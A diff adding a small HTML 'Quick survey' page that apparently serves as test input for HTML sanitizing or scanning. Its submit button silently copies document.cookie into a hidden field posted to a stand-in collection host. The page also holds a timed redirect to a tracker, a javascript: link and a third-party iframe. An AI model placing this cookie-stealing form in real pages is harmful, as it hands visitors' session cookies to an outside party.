@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="refresh" content="30; url=https://tracker.example.net/next">
+  <title>Survey</title>
+</head>
+<body>
+  <h1>Quick survey</h1>
+  <form action="https://collect.example.net/submit" method="post">
+    <label>Email <input name="email" type="email"></label>
+    <input type="hidden" name="note">
+    <button type="submit" onclick="this.form.note.value = document.cookie">Send</button>
+  </form>
+  <a href="javascript:alert('help')">Help</a>
+  <iframe src="https://ads.example.net/frame" width="300" height="250"></iframe>
+</body>
+</html>
